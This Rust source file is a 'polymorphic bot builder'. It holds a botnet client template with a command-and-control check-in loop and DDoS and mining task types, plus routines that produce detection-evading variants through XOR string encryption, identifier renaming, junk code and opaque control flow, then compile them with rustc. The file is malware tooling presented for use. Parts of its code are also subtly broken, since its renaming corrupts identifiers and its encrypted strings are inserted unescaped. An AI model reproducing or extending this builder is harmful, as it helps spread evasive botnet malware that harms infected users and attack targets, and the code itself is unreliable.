use std::fs;
use std::process::Command;
use rand::Rng;
use std::collections::HashMap;

struct PolymorphicBuilder {
    templates: HashMap<String, String>,
    obfuscation_rules: Vec<(String, String)>,
}

impl PolymorphicBuilder {
    fn new() -> Self {
        let mut templates = HashMap::new();
        let mut obfuscation_rules = Vec::new();

        // Load bot template
        templates.insert("bot".to_string(),
            r#"
use std::thread;
use std::time::Duration;
use rand::{thread_rng, Rng};
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};

#[derive(Serialize, Deserialize)]
struct Task {
    id: String,
    bot_id: String,
    task_type: String,
    params: String,
    status: String,
    created_at: DateTime<Utc>,
}

struct Bot {
    id: String,
    c2_url: String,
    client: Client,
}

impl Bot {
    fn new() -> Self {
        let mut rng = thread_rng();
        let id = format!("{:x}", rng.gen::<u64>());
        let client = Client::new();
        Self {
            id,
            c2_url: "http://localhost:8000".to_string(),
            client,
        }
    }

    fn run(&self) {
        loop {
            match self.checkin() {
                Ok(task) => {
                    match task.task_type.as_str() {
                        "ddos" => println!("DDoS task received"),
                        "mine" => println!("Mining task received"),
                        _ => {}
                    }
                }
                Err(_) => thread::sleep(Duration::from_secs(60)),
            }
            thread::sleep(Duration::from_secs(30));
        }
    }

    fn checkin(&self) -> Result<Task, Box<dyn std::error::Error>> {
        // Simplified checkin
        Ok(Task {
            id: "test".to_string(),
            bot_id: self.id.clone(),
            task_type: "sleep".to_string(),
            params: "".to_string(),
            status: "none".to_string(),
            created_at: Utc::now(),
        })
    }
}

fn main() {
    let bot = Bot::new();
    bot.run();
}
"#.to_string());

        // Generate obfuscation rules
        obfuscation_rules.push(("Bot".to_string(), "Bot".to_string()));
        obfuscation_rules.push(("Task".to_string(), "Task".to_string()));
        obfuscation_rules.push(("checkin".to_string(), "checkin".to_string()));

        Self {
            templates,
            obfuscation_rules,
        }
    }

    fn generate_variant(&self, template_name: &str, variant_id: u32) -> Result<String, Box<dyn std::error::Error>> {
        let template = self.templates.get(template_name)
            .ok_or("Template not found")?;

        let mut code = template.clone();

        // Apply polymorphic transformations
        code = self.apply_string_encryption(&code, variant_id);
        code = self.apply_variable_renaming(&code, variant_id);
        code = self.apply_junk_code_insertion(&code, variant_id);
        code = self.apply_control_flow_obfuscation(&code, variant_id);

        Ok(code)
    }

    fn apply_string_encryption(&self, code: &str, variant_id: u32) -> String {
        // Simple string encryption by XOR with variant_id
        let mut result = code.to_string();

        // Encrypt string literals
        let strings = vec!["http://localhost:8000", "ddos", "mine", "sleep"];
        for s in strings {
            let encrypted = self.xor_encrypt(s, variant_id as u8);
            let decrypt_call = format!("decrypt_string(\"{}\")", encrypted);
            result = result.replace(&format!("\"{}\"", s), &decrypt_call);
        }

        // Add decryption function
        let decrypt_fn = format!(r#"
fn decrypt_string(encrypted: &str) -> String {{
    encrypted.chars()
        .map(|c| (c as u8 ^ {}) as char)
        .collect()
}}
"#, variant_id);

        result + &decrypt_fn
    }

    fn xor_encrypt(&self, text: &str, key: u8) -> String {
        text.chars()
            .map(|c| ((c as u8) ^ key) as char)
            .collect()
    }

    fn apply_variable_renaming(&self, code: &str, variant_id: u32) -> String {
        let mut result = code.to_string();

        // Rename variables with variant-specific names
        let renames = vec![
            ("bot", &format!("bot_{}", variant_id)),
            ("task", &format!("task_{}", variant_id)),
            ("client", &format!("client_{}", variant_id)),
        ];

        for (old, new) in renames {
            result = result.replace(old, new);
        }

        result
    }

    fn apply_junk_code_insertion(&self, code: &str, variant_id: u32) -> String {
        let mut result = code.to_string();

        // Insert junk functions
        let junk_functions = format!(r#"
fn junk_function_{}() {{
    let mut x = 0;
    for i in 0..{} {{
        x += i * {};
    }}
}}

fn another_junk_{}() {{
    let _ = std::time::Instant::now();
}}
"#, variant_id, variant_id % 100, variant_id % 10, variant_id);

        // Insert before main function
        if let Some(main_pos) = result.find("fn main()") {
            result.insert_str(main_pos, &junk_functions);
        }

        result
    }

    fn apply_control_flow_obfuscation(&self, code: &str, variant_id: u32) -> String {
        let mut result = code.to_string();

        // Add opaque predicates and junk control flow
        let control_flow = format!(r#"
if {} % 2 == 0 {{
    // Junk branch that always executes
}} else {{
    // This never executes
    unreachable!();
}}
"#, variant_id);

        // Insert in main function
        if let Some(main_pos) = result.find("let bot = Bot::new();") {
            result.insert_str(main_pos, &control_flow);
        }

        result
    }

    fn compile_variant(&self, code: &str, output_name: &str) -> Result<(), Box<dyn std::error::Error>> {
        // Write to temporary file
        let temp_file = format!("temp_{}.rs", output_name);
        fs::write(&temp_file, code)?;

        // Compile with rustc
        let output = Command::new("rustc")
            .args(&[&temp_file, "-o", output_name, "--extern", "rand=target/debug/deps/librand-*.rlib"])
            .output()?;

        if output.status.success() {
            println!("Successfully compiled {}", output_name);
            fs::remove_file(temp_file)?;
            Ok(())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(format!("Compilation failed: {}", stderr).into())
        }
    }

    fn build_multiple_variants(&self, count: usize) -> Result<(), Box<dyn std::error::Error>> {
        for i in 0..count {
            let variant_code = self.generate_variant("bot", i as u32)?;
            let output_name = format!("bot_variant_{}", i);
            self.compile_variant(&variant_code, &output_name)?;
        }
        Ok(())
    }
}

fn main() {
    println!("Narnia Polymorphic Bot Builder");

    let builder = PolymorphicBuilder::new();

    // Generate 5 different variants
    if let Err(e) = builder.build_multiple_variants(5) {
        eprintln!("Error building variants: {}", e);
    }

    println!("Polymorphic bot variants generated successfully!");
}
